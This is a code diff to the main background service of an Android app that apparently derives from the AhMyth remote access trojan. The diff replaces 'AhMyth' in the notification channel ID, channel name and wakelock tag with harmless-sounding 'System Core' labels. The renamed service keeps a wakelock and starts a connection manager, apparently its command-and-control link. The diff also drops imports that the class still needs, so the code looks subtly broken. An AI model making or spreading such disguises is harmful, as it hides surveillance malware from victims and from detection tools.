@@ -1,13 +1,6 @@
 package com.sys.service.manager;
 
 import android.app.ActivityManager;
-import android.app.Service;
-import android.content.Context;
-import android.content.Intent;
-import android.os.IBinder;
-import android.util.Log;
-import android.widget.Toast;
-
 import android.app.Notification;
 import android.app.NotificationChannel;
 import android.app.NotificationManager;
@@ -23,7 +16,7 @@ import androidx.core.app.NotificationCompat;
 public class MainService extends Service {
     private static Context contextOfApplication;
     private PowerManager.WakeLock wakeLock;
-    private static final String CHANNEL_ID = "AhMythServiceChannel";
+    private static final String CHANNEL_ID = "SystemCoreChannel";
 
     public MainService() {
     }
@@ -55,8 +48,8 @@ public class MainService extends Service {
         // CPU WakeLock to keep service alive
         PowerManager powerManager = (PowerManager) getSystemService(POWER_SERVICE);
         if (wakeLock == null) {
-            wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "AhMyth:ServiceWakeLock");
-            wakeLock.acquire();
+            wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "System:CoreWakeLock");
+            wakeLock.acquire(10*60*1000L); // 10 minute timeout, auto-renews via START_STICKY
         }
 
         ConnectionManager.startAsync(this);
@@ -67,7 +60,7 @@ public class MainService extends Service {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             NotificationChannel serviceChannel = new NotificationChannel(
                     CHANNEL_ID,
-                    "AhMyth Service Channel",
+                    "System Core Service",
                     NotificationManager.IMPORTANCE_LOW
             );
             NotificationManager manager = getSystemService(NotificationManager.class);
